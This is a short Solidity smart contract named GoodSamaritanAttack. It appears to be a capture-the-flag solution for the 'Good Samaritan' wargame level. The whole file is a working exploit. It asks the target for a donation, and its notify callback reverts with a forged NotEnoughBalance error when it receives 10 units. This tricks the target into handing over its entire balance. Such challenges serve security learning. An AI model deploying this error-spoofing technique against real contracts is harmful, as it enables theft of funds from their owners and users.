// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttack {
    error NotEnoughBalance();
    
    function attack(address _targetAddress) external {
        IGoodSamaritan(_targetAddress).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

}